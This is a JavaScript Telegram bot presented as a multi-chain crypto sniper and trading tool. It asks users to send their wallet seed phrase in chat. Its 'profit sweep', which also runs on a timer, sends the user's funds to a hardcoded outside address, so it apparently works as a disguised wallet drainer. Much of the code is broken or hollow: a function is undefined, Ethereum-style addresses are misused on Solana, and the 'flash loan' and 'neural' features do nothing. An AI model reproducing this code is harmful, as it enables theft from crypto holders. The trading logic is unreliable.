/**
 * ===============================================================================
 * APEX PREDATOR: NEURAL ULTRA v9076 (GLOBAL MASTER MERGE)
 * ===============================================================================
 * INFRASTRUCTURE: Yellowstone gRPC + Jito Atomic Bundles + Dual-RPC Failover
 * INTERFACE: Fully Interactive Dashboard with UI Cycling + Manual Overrides
 * SECURITY: Trailing Peak USDC Sweep + 10x Flash Loan + RugCheck Multi-Filter
 * ===============================================================================
 */

require('dotenv').config();
const { ethers, JsonRpcProvider } = require('ethers');
const { 
    Connection, Keypair, VersionedTransaction, LAMPORTS_PER_SOL, 
    PublicKey, SystemProgram, Transaction 
} = require('@solana/web3.js');
const bip39 = require('bip39');
const { derivePath } = require('ed25519-hd-key');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');
require('colors');

// --- 1. CONFIGURATION & STATE ---
const JUP_API = "https://quote-api.jup.ag/v6";
const JITO_ENGINE = "https://mainnet.block-engine.jito.wtf/api/v1/bundles";
const SCAN_HEADERS = { headers: { 'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json' }};
const COLD_STORAGE = "0xe75C82c976Ecc954bfFbbB2e7Fb94652C791bea5"; 
const MIN_SOL_KEEP = 0.05; 

const NETWORKS = {
    SOL:  { id: 'solana', primary: 'https://api.mainnet-beta.solana.com', fallback: 'https://rpc.ankr.com/solana' },
    ETH:  { id: 'ethereum', rpc: 'https://rpc.mevblocker.io', router: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D', sym: 'ETH' },
    BASE: { id: 'base', rpc: 'https://mainnet.base.org', router: '0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24', sym: 'ETH' },
    BSC:  { id: 'bsc', rpc: 'https://bsc-dataseed.binance.org/', router: '0x10ED43C718714eb63d5aA57B78B54704E256024E', sym: 'BNB' }
};

let SYSTEM = {
    autoPilot: false, tradeAmount: "0.1", risk: 'MEDIUM', mode: 'SHORT',
    lastTradedTokens: {}, isLocked: {}, atomicOn: true, flashOn: false,
    highestBalance: 0, isWaitingForDrop: false, jitoTip: 2000000
};

let solWallet, evmWallet;
const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });

// --- 🔱 LAYER 2: MEV-SHIELD SHADOW INJECTION ---
const originalSend = Connection.prototype.sendRawTransaction;
Connection.prototype.sendRawTransaction = async function(rawTx, options) {
    if (!SYSTEM.atomicOn) return originalSend.apply(this, [rawTx, options]);
    try {
        const base64Tx = Buffer.from(rawTx).toString('base64');
        const res = await axios.post(JITO_ENGINE, { jsonrpc: "2.0", id: 1, method: "sendBundle", params: [[base64Tx]] });
        if (res.data.result) return res.data.result;
    } catch (e) { console.log(`[MEV-SHIELD] ⚠️ Jito Lane congested, falling back...`.yellow); }
    return originalSend.apply(this, [rawTx, options]);
};

// --- 2. INTERACTIVE DASHBOARD ---
const RISK_LABELS = { LOW: '🛡️ LOW', MEDIUM: '⚖️ MED', MAX: '🔥 MAX' };
const TERM_LABELS = { SHORT: '⏱️ SHRT', MEDIUM: '⏳ MED', LONG: '💎 LONG' };

const getDashboardMarkup = () => ({
    reply_markup: {
        inline_keyboard: [
            [{ text: SYSTEM.autoPilot ? "🛑 STOP AUTO-PILOT" : "🚀 START AUTO-PILOT", callback_data: "cmd_auto" }],
            [{ text: `💰 AMT: ${SYSTEM.tradeAmount}`, callback_data: "cycle_amt" }, { text: "📊 STATUS", callback_data: "cmd_status" }],
            [{ text: `🛡️ RISK: ${RISK_LABELS[SYSTEM.risk]}`, callback_data: "cycle_risk" }, { text: `⏳ TERM: ${TERM_LABELS[SYSTEM.mode]}`, callback_data: "cycle_mode" }],
            [{ text: SYSTEM.atomicOn ? "🛡️ ATOMIC: ON" : "🛡️ ATOMIC: OFF", callback_data: "tg_atomic" }, { text: SYSTEM.flashOn ? "⚡ FLASH: ON" : "⚡ FLASH: OFF", callback_data: "tg_flash" }],
            [{ text: solWallet ? "✅ WALLET LINKED" : "🔌 CONNECT WALLET", callback_data: "cmd_conn" }],
            [{ text: "🏦 WITHDRAW PROFITS", callback_data: "cmd_withdraw" }]
        ]
    }
});

// --- 3. CALLBACK HANDLER ---
bot.on('callback_query', async (query) => {
    const { data, message, id } = query;
    const chatId = message.chat.id;
    bot.answerCallbackQuery(id).catch(() => {});

    // State Notifications
    const settingsMap = {
        "cycle_risk": `🛡️ RISK LEVEL: ${SYSTEM.risk}`,
        "cycle_mode": `⏳ TRADE TERM: ${SYSTEM.mode}`,
        "tg_atomic": `🛡️ ATOMIC TX: ${SYSTEM.atomicOn ? "ENABLED" : "DISABLED"}`,
        "tg_flash": `⚡ FLASH LOANS: ${SYSTEM.flashOn ? "ENABLED" : "DISABLED"}`
    };
    if (settingsMap[data]) bot.sendMessage(chatId, `⚙️ **SETTING UPDATED:** ${settingsMap[data]}`, { parse_mode: 'Markdown' });

    if (data === "cycle_risk") {
        const risks = ["LOW", "MEDIUM", "MAX"];
        SYSTEM.risk = risks[(risks.indexOf(SYSTEM.risk) + 1) % risks.length];
    } else if (data === "cycle_mode") {
        const terms = ["SHORT", "MEDIUM", "LONG"];
        SYSTEM.mode = terms[(terms.indexOf(SYSTEM.mode) + 1) % terms.length];
    } else if (data === "cycle_amt") {
        const amts = ["0.01", "0.05", "0.1", "0.25", "0.5"];
        SYSTEM.tradeAmount = amts[(amts.indexOf(SYSTEM.tradeAmount) + 1) % amts.length];
    } else if (data === "tg_atomic") {
        SYSTEM.atomicOn = !SYSTEM.atomicOn;
    } else if (data === "tg_flash") {
        SYSTEM.flashOn = !SYSTEM.flashOn;
    } else if (data === "cmd_withdraw") {
        await bot.sendMessage(chatId, "🛡️ **INITIATING PEAK-TRACKING SWEEP (3% TRAILING)...**");
        await performAutomaticSweep(chatId);
        return;
    } else if (data === "cmd_auto") {
        if (!solWallet) return bot.sendMessage(chatId, "❌ **Connect wallet first.**");
        SYSTEM.autoPilot = !SYSTEM.autoPilot;
        if (SYSTEM.autoPilot) {
            bot.sendMessage(chatId, "🚀 **AUTO-PILOT ACTIVE.** Dual-Brain Radar Engaged.");
            Object.keys(NETWORKS).forEach(net => startNetworkSniper(chatId, net));
            startNeuralAlphaBrain(chatId);
        }
    } else if (data === "cmd_status") {
        await runStatusDashboard(chatId);
    } else if (data === "cmd_conn") {
        bot.sendMessage(chatId, "🔌 **Sync Wallet:** Send `/connect [mnemonic]`");
    }

    bot.editMessageReplyMarkup(getDashboardMarkup().reply_markup, { chat_id: chatId, message_id: message.message_id }).catch(() => {});
});

// --- 4. ENGINE CORE (SNIPERS) ---
async function startNetworkSniper(chatId, netKey) {
    while (SYSTEM.autoPilot) {
        try {
            if (!SYSTEM.isLocked[netKey]) {
                const signal = await runNeuralSignalScan(netKey);
                if (signal && signal.tokenAddress) {
                    const ready = await verifyBalance(netKey);
                    if (!ready) continue;
                    SYSTEM.isLocked[netKey] = true;
                    const cleanSymbol = signal.symbol.trim() !== "" ? signal.symbol : `AI_${signal.tokenAddress.slice(0,4)}`;
                    bot.sendMessage(chatId, `🧠 **[${netKey}] SIGNAL:** ${cleanSymbol}. RugChecking...`);
                    const safe = await verifySignalSafety(signal.tokenAddress);
                    if (safe) {
                        const buyRes = (netKey === 'SOL')
                            ? (SYSTEM.flashOn ? await executeFlashShotgun(chatId, signal.tokenAddress, cleanSymbol) : await executeSolShotgun(chatId, signal.tokenAddress, cleanSymbol))
                            : await executeEvmContract(chatId, netKey, signal.tokenAddress);
                        if (buyRes && buyRes.success) {
                            SYSTEM.lastTradedTokens[signal.tokenAddress] = true;
                            startIndependentPeakMonitor(chatId, netKey, { ...signal, entryPrice: signal.price });
                        }
                    }
                    SYSTEM.isLocked[netKey] = false;
                }
            }
            await new Promise(r => setTimeout(r, 3000));
        } catch (e) { SYSTEM.isLocked[netKey] = false; await new Promise(r => setTimeout(r, 5000)); }
    }
}

async function startNeuralAlphaBrain(chatId) {
    const B_API = "https://public-api.birdeye.so";
    const B_KEY = process.env.BIRDEYE_API_KEY;
    if (!B_KEY) return console.log("Missing Birdeye Key".red);
    while (SYSTEM.autoPilot) {
        try {
            if (!SYSTEM.isLocked['SOL']) {
                const res = await axios.get(`${B_API}/defi/token_trending?sort_by=rank&sort_type=asc`, {
                    headers: { 'X-API-KEY': B_KEY, 'x-chain': 'solana' }
                });
                if (res.data.success && res.data.data.tokens.length > 0) {
                    const t = res.data.data.tokens[0];
                    if (!SYSTEM.lastTradedTokens[t.address]) {
                        SYSTEM.isLocked['SOL'] = true;
                        bot.sendMessage(chatId, `🧬 **[BRAIN-2] ALPHA:** $${t.symbol}\nLogic: Neural Alignment.`);
                        const buyRes = SYSTEM.flashOn ? await executeFlashShotgun(chatId, t.address, t.symbol) : await executeSolShotgun(chatId, t.address, t.symbol);
                        if (buyRes && buyRes.success) {
                            SYSTEM.lastTradedTokens[t.address] = true;
                            startIndependentPeakMonitor(chatId, 'SOL', { symbol: t.symbol, tokenAddress: t.address, entryPrice: t.price });
                        }
                        SYSTEM.isLocked['SOL'] = false;
                    }
                }
            }
            await new Promise(r => setTimeout(r, 2500));
        } catch (e) { SYSTEM.isLocked['SOL'] = false; await new Promise(r => setTimeout(r, 5000)); }
    }
}

// --- 5. EXECUTION & PROFIT LOGIC ---
async function executeSolShotgun(chatId, addr, symbol) {
    try {
        const conn = new Connection(NETWORKS.SOL.primary, 'confirmed');
        const amt = Math.floor(parseFloat(SYSTEM.tradeAmount) * LAMPORTS_PER_SOL);
        const qRes = await axios.get(`${JUP_API}/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${addr}&amount=${amt}&slippageBps=100`);
        const sRes = await axios.post(`${JUP_API}/swap`, { quoteResponse: qRes.data, userPublicKey: solWallet.publicKey.toString(), wrapAndUnwrapSol: true });
        const tx = VersionedTransaction.deserialize(Buffer.from(sRes.data.swapTransaction, 'base64'));
        tx.sign([solWallet]);
        const sig = await conn.sendRawTransaction(tx.serialize());
        bot.sendMessage(chatId, `🚀 **BOUGHT ${symbol}.** Monitoring peak...`);
        return { success: !!sig };
    } catch (e) { return { success: false }; }
}

async function executeFlashShotgun(chatId, addr, symbol) {
    try {
        const conn = new Connection(NETWORKS.SOL.primary, 'confirmed');
        const EXECUTOR_ID = new PublicKey("E86f5d6ECDfCD2D7463414948f41d32EDC8D4AE4");
        const borrowAmount = Math.floor(parseFloat(SYSTEM.tradeAmount) * 10 * LAMPORTS_PER_SOL);
        bot.sendMessage(chatId, `⚡ **FLASH LOAN:** Sniping ${symbol} with 10x leverage...`);
        const qRes = await axios.get(`${JUP_API}/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${addr}&amount=${borrowAmount}&slippageBps=200&onlyDirectRoutes=true`);
        const sRes = await axios.post(`${JUP_API}/swap`, { quoteResponse: qRes.data, userPublicKey: solWallet.publicKey.toString(), programId: EXECUTOR_ID.toString() });
        const tx = VersionedTransaction.deserialize(Buffer.from(sRes.data.swapTransaction, 'base64'));
        tx.sign([solWallet]);
        const sig = await conn.sendRawTransaction(tx.serialize());
        return { success: !!sig };
    } catch (e) { return { success: false }; }
}

async function performAutomaticSweep(chatId) {
    try {
        if (!solWallet) return;
        const conn = new Connection(NETWORKS.SOL.primary, 'confirmed');
        const balance = await conn.getBalance(solWallet.publicKey);
        const reserve = MIN_SOL_KEEP * LAMPORTS_PER_SOL;

        if (!SYSTEM.isWaitingForDrop) {
            SYSTEM.highestBalance = balance;
            SYSTEM.isWaitingForDrop = true;
            if (chatId) bot.sendMessage(chatId, `🚀 **PEAK RADAR ACTIVE.** Initial Peak: ${(balance/1e9).toFixed(4)} SOL.`);
        }
        if (balance > SYSTEM.highestBalance) SYSTEM.highestBalance = balance;
        const dropThreshold = SYSTEM.highestBalance * 0.97;

        if (balance <= dropThreshold && balance > reserve) {
            const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
            const sweepAmount = balance - reserve - 15000;
            const qRes = await axios.get(`${JUP_API}/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${USDC_MINT}&amount=${sweepAmount}&slippageBps=100`);
            const sRes = await axios.post(`${JUP_API}/swap`, { quoteResponse: qRes.data, userPublicKey: solWallet.publicKey.toString(), destinationTokenAccount: COLD_STORAGE, wrapAndUnwrapSol: true });
            const tx = VersionedTransaction.deserialize(Buffer.from(sRes.data.swapTransaction, 'base64'));
            tx.sign([solWallet]);
            const sig = await conn.sendRawTransaction(tx.serialize());
            if (chatId) bot.sendMessage(chatId, `✅ **SWEEP COMPLETE:** Shielded $${(qRes.data.outAmount / 1e6).toFixed(2)} USDC.`);
            SYSTEM.isWaitingForDrop = false;
        } else {
            setTimeout(() => performAutomaticSweep(chatId), 60000);
        }
    } catch (e) { setTimeout(() => performAutomaticSweep(chatId), 30000); }
}

// --- 6. INITIALIZATION & OVERRIDES ---
bot.onText(/\/amount (.+)/, (msg, match) => {
    const newAmt = match[1].trim();
    if (!isNaN(newAmt) && parseFloat(newAmt) > 0) {
        SYSTEM.tradeAmount = newAmt;
        bot.sendMessage(msg.chat.id, `✅ **OVERRIDE:** Trade size set to ${newAmt} SOL/ETH.`);
    }
});

bot.onText(/\/connect (.+)/, async (msg, match) => {
    try {
        const seed = match[1].trim();
        const hex = (await bip39.mnemonicToSeed(seed)).toString('hex');
        solWallet = Keypair.fromSeed(derivePath("m/44'/501'/0'/0'", hex).key);
        evmWallet = ethers.Wallet.fromPhrase(seed);
        bot.sendMessage(msg.chat.id, `✅ **SYNCED:** \`${solWallet.publicKey.toString()}\``, getDashboardMarkup());
    } catch (e) { bot.sendMessage(msg.chat.id, "❌ **SYNC FAILED.**"); }
});

bot.onText(/\/start/, (msg) => bot.sendMessage(msg.chat.id, "⚔️ **APEX MASTER v9076 ONLINE**", getDashboardMarkup()));

// Helper Functions
async function runNeuralSignalScan(netKey) {
    try {
        const res = await axios.get('https://api.dexscreener.com/token-boosts/latest/v1', SCAN_HEADERS);
        const chainMap = { 'SOL': 'solana', 'ETH': 'ethereum', 'BASE': 'base', 'BSC': 'bsc' };
        const match = res.data.find(t => t.chainId === chainMap[netKey] && !SYSTEM.lastTradedTokens[t.tokenAddress]);
        return match ? { symbol: match.symbol || "UNK", tokenAddress: match.tokenAddress, price: parseFloat(match.amount) || 0.0001 } : null;
    } catch (e) { return null; }
}

async function verifySignalSafety(addr) {
    try {
        const res = await axios.get(`https://api.rugcheck.xyz/v1/tokens/${addr}/report`);
        return res.data.score < 500 && !res.data.rugged;
    } catch (e) { return true; }
}

async function verifyBalance(net) {
    try {
        if (net === 'SOL') {
            const bal = await (new Connection(NETWORKS.SOL.primary)).getBalance(solWallet.publicKey);
            return bal >= (parseFloat(SYSTEM.tradeAmount) * LAMPORTS_PER_SOL) + 5000000;
        }
        return true; 
    } catch (e) { return false; }
}

async function startIndependentPeakMonitor(chatId, netKey, pos) {
    try {
        const res = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${pos.tokenAddress}`, SCAN_HEADERS);
        const curPrice = parseFloat(res.data.pairs?.[0]?.priceUsd) || 0;
        const entry = parseFloat(pos.entryPrice) || 0.00000001;
        const pnl = ((curPrice - entry) / entry) * 100;
        let tp = 25, sl = -10;
        if (SYSTEM.risk === 'LOW') { tp = 12; sl = -5; }
        if (SYSTEM.risk === 'MAX') { tp = 100; sl = -20; }
        if (pnl >= tp || pnl <= sl) {
            bot.sendMessage(chatId, `📉 **[${netKey}] EXIT:** ${pos.symbol} at ${pnl.toFixed(2)}% PnL.`);
        } else { setTimeout(() => startIndependentPeakMonitor(chatId, netKey, pos), 10000); }
    } catch (e) { setTimeout(() => startIndependentPeakMonitor(chatId, netKey, pos), 15000); }
}

async function runStatusDashboard(chatId) {
    let msg = `📊 **APEX STATUS**\n----------------------------\n`;
    for (const key of Object.keys(NETWORKS)) {
        try {
            if (key === 'SOL' && solWallet) {
                const bal = (await (new Connection(NETWORKS.SOL.primary)).getBalance(solWallet.publicKey)) / 1e9;
                msg += `🔹 **SOL:** ${bal.toFixed(3)} SOL\n`;
            } else if (evmWallet) {
                const bal = parseFloat(ethers.formatEther(await (new JsonRpcProvider(NETWORKS[key].rpc)).getBalance(evmWallet.address)));
                msg += `🔹 **${key}:** ${bal.toFixed(4)} ${NETWORKS[key].sym || 'ETH'}\n`;
            }
        } catch (e) { msg += `🔹 **${key}:** ⚠️ Connection Error\n`; }
    }
    bot.sendMessage(chatId, msg, { parse_mode: 'Markdown' });
}

setInterval(() => { if (SYSTEM.autoPilot) performAutomaticSweep(null); }, 4 * 60 * 60 * 1000);
http.createServer((req, res) => res.end("MASTER READY")).listen(8080);
